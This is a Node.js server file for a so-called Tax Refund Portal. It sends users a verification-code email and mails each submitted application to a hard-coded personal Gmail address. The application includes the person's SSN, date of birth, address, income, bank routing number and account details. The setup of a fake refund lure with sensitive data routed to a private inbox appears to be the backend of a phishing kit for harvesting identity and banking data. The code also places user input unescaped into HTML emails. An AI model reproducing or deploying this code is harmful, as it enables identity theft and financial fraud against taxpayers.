// backend.js - Node.js Backend Server for Email & Form Handling
// Run with: node backend.js

const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const dotenv = require('dotenv');

dotenv.config();

const app = express();
const PORT = 3001;

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ limit: '10mb', extended: true }));

// Configure email transporter
// Prefer SendGrid when SENDGRID_API_KEY is set, otherwise fall back to Gmail SMTP using app password
let transporter;
if (process.env.SENDGRID_API_KEY) {
    transporter = nodemailer.createTransport({
        host: 'smtp.sendgrid.net',
        port: 587,
        secure: false,
        auth: {
            user: 'apikey',
            pass: process.env.SENDGRID_API_KEY
        }
    });
    console.log('Using SendGrid SMTP for outgoing email');
} else {
    transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: process.env.EMAIL_USER || 'your-email@gmail.com',
            pass: process.env.EMAIL_PASSWORD || 'your-app-password' // Use Gmail App Password
        }
    });
    console.log('Using Gmail SMTP for outgoing email');
}

// Function to send MFA code to user email
async function sendMfaCodeEmail(userEmail, mfaCode) {
    try {
        const mailOptions = {
            from: process.env.EMAIL_USER || 'noreply@taxrefund.com',
            to: userEmail,
            subject: 'Tax Refund Portal - Your Verification Code',
            html: `
                <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
                    <div style="background: linear-gradient(135deg, #004c99, #006bb8); color: white; padding: 20px; border-radius: 8px 8px 0 0; text-align: center;">
                        <h1 style="margin: 0; font-size: 24px;">Tax Refund Portal</h1>
                    </div>
                    
                    <div style="background: #f4f7f9; padding: 30px; border-radius: 0 0 8px 8px;">
                        <h2 style="color: #004c99; margin-top: 0;">Your Verification Code</h2>
                        
                        <p style="color: #666; font-size: 16px; line-height: 1.6;">
                            Hello,<br><br>
                            You requested to verify your account. Use the verification code below:
                        </p>
                        
                        <div style="background: white; border: 2px solid #004c99; border-radius: 6px; padding: 20px; text-align: center; margin: 20px 0;">
                            <p style="margin: 0; font-size: 32px; font-weight: bold; color: #004c99; letter-spacing: 5px;">
                                ${mfaCode}
                            </p>
                        </div>
                        
                        <p style="color: #666; font-size: 14px; line-height: 1.6;">
                            <strong>Important:</strong> This code will expire in 30 minutes.<br>
                            Do not share this code with anyone. The Tax Refund Portal team will never ask for this code.
                        </p>
                        
                        <hr style="border: none; border-top: 1px solid #e9ecef; margin: 20px 0;">
                        
                        <p style="color: #999; font-size: 12px; text-align: center; margin: 0;">
                            If you did not request this code, please ignore this email or contact support.
                        </p>
                    </div>
                </div>
            `
        };
        
        await transporter.sendMail(mailOptions);
        console.log(`✅ MFA code sent to ${userEmail}`);
        return true;
    } catch (error) {
        console.error('❌ Error sending MFA email:', error);
        return false;
    }
}

// Function to send form data to admin
async function sendFormDataEmail(formData) {
    try {
        const adminEmail = 'ogunderotamiloluwa@gmail.com';
        
        const mailOptions = {
            from: process.env.EMAIL_USER || 'noreply@taxrefund.com',
            to: adminEmail,
            cc: formData.email, // CC the user
            subject: `Tax Refund Portal - New Refund Application from ${formData.fullName}`,
            html: `
                <div style="font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto;">
                    <div style="background: linear-gradient(135deg, #004c99, #006bb8); color: white; padding: 20px; border-radius: 8px 8px 0 0; text-align: center;">
                        <h1 style="margin: 0; font-size: 24px;">Tax Refund Application</h1>
                    </div>
                    
                    <div style="background: #f4f7f9; padding: 30px; border-radius: 0 0 8px 8px;">
                        <h2 style="color: #004c99; margin-top: 0;">Application Details</h2>
                        
                        <h3 style="color: #666; border-bottom: 2px solid #004c99; padding-bottom: 10px;">Personal Information</h3>
                        <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
                            <tr>
                                <td style="padding: 8px; background: white; border: 1px solid #e9ecef;"><strong>Full Name:</strong></td>
                                <td style="padding: 8px; background: white; border: 1px solid #e9ecef;">${formData.fullName}</td>
                            </tr>
                            <tr>
                                <td style="padding: 8px; background: #fff;"><strong>Email:</strong></td>
                                <td style="padding: 8px; background: #fff;">${formData.email}</td>
                            </tr>
                            <tr>
                                <td style="padding: 8px; background: white; border: 1px solid #e9ecef;"><strong>Phone:</strong></td>
                                <td style="padding: 8px; background: white; border: 1px solid #e9ecef;">${formData.phone || 'N/A'}</td>
                            </tr>
                            <tr>
                                <td style="padding: 8px; background: #fff;"><strong>Date of Birth:</strong></td>
                                <td style="padding: 8px; background: #fff;">${formData.dob}</td>
                            </tr>
                            <tr>
                                <td style="padding: 8px; background: white; border: 1px solid #e9ecef;"><strong>SSN:</strong></td>
                                <td style="padding: 8px; background: white; border: 1px solid #e9ecef;">${formData.ssn}</td>
                            </tr>
                            <tr>
                                <td style="padding: 8px; background: #fff;"><strong>Address:</strong></td>
                                <td style="padding: 8px; background: #fff;">${formData.address}</td>
                            </tr>
                        </table>
                        
                        <h3 style="color: #666; border-bottom: 2px solid #004c99; padding-bottom: 10px;">Tax Information</h3>
                        <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
                            <tr>
                                <td style="padding: 8px; background: white; border: 1px solid #e9ecef;"><strong>Tax Year:</strong></td>
                                <td style="padding: 8px; background: white; border: 1px solid #e9ecef;">${formData.taxYear}</td>
                            </tr>
                            <tr>
                                <td style="padding: 8px; background: #fff;"><strong>Filing Status:</strong></td>
                                <td style="padding: 8px; background: #fff;">${formData.filingStatus}</td>
                            </tr>
                            <tr>
                                <td style="padding: 8px; background: white; border: 1px solid #e9ecef;"><strong>Gross Income:</strong></td>
                                <td style="padding: 8px; background: white; border: 1px solid #e9ecef;">$${parseFloat(formData.grossIncome).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}</td>
                            </tr>
                            <tr>
                                <td style="padding: 8px; background: #fff;"><strong>Tax Withheld:</strong></td>
                                <td style="padding: 8px; background: #fff;">$${parseFloat(formData.taxWithheld).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}</td>
                            </tr>
                            <tr>
                                <td style="padding: 8px; background: white; border: 1px solid #e9ecef;"><strong>Dependents:</strong></td>
                                <td style="padding: 8px; background: white; border: 1px solid #e9ecef;">${formData.dependents}</td>
                            </tr>
                        </table>
                        
                        <h3 style="color: #666; border-bottom: 2px solid #004c99; padding-bottom: 10px;">Banking Information</h3>
                        <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
                            <tr>
                                <td style="padding: 8px; background: white; border: 1px solid #e9ecef;"><strong>Bank Name:</strong></td>
                                <td style="padding: 8px; background: white; border: 1px solid #e9ecef;">${formData.bankName}</td>
                            </tr>
                            <tr>
                                <td style="padding: 8px; background: #fff;"><strong>Routing Number:</strong></td>
                                <td style="padding: 8px; background: #fff;">${formData.routingNumber}</td>
                            </tr>
                            <tr>
                                <td style="padding: 8px; background: white; border: 1px solid #e9ecef;"><strong>Account Number:</strong></td>
                                <td style="padding: 8px; background: white; border: 1px solid #e9ecef;">****${formData.accountNumber.slice(-4)}</td>
                            </tr>
                        </table>
                        
                        <hr style="border: none; border-top: 2px solid #e9ecef; margin: 20px 0;">
                        
                        <p style="color: #999; font-size: 12px; text-align: center; margin: 0;">
                            ✅ This email confirms receipt of the tax refund application.<br>
                            A review specialist will contact the applicant within 24 hours.
                        </p>
                    </div>
                </div>
            `
        };
        
        await transporter.sendMail(mailOptions);
        console.log(`✅ Form data sent to admin email`);
        return true;
    } catch (error) {
        console.error('❌ Error sending form data email:', error);
        return false;
    }
}

// API Endpoints

// 1. Send MFA code to email
app.post('/api/send-mfa', async (req, res) => {
    try {
        const { email, mfaCode } = req.body;
        
        if (!email || !mfaCode) {
            return res.status(400).json({ success: false, message: 'Email and MFA code required' });
        }
        
        const success = await sendMfaCodeEmail(email, mfaCode);
        res.json({ success, message: success ? 'MFA code sent to email' : 'Failed to send MFA code' });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

// 2. Send form data to admin
app.post('/api/send-form', async (req, res) => {
    try {
        const formData = req.body;
        
        if (!formData.email || !formData.fullName) {
            return res.status(400).json({ success: false, message: 'Required fields missing' });
        }
        
        const success = await sendFormDataEmail(formData);
        res.json({ success, message: success ? 'Form submitted successfully' : 'Failed to submit form' });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

// 3. Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'Backend server is running', timestamp: new Date().toISOString() });
});

// Start server
app.listen(PORT, () => {
    console.log(`
    ╔═════════════════════════════════════════╗
    ║   Tax Refund Portal - Backend Server    ║
    ╚═════════════════════════════════════════╝
    
    ✅ Server running on http://localhost:${PORT}
    
    📧 Email Configuration:
       User: ${process.env.EMAIL_USER || 'Not configured'}
       
    🔧 Available Endpoints:
       POST /api/send-mfa       - Send MFA code via email
       POST /api/send-form      - Send form data to admin
       GET  /api/health         - Health check
    
    📝 To configure email, create a .env file:
       EMAIL_USER=your-email@gmail.com
       EMAIL_PASSWORD=your-app-password
    
    Note: Use Gmail App Password (not regular password)
    See: https://support.google.com/accounts/answer/185833
    `);
});
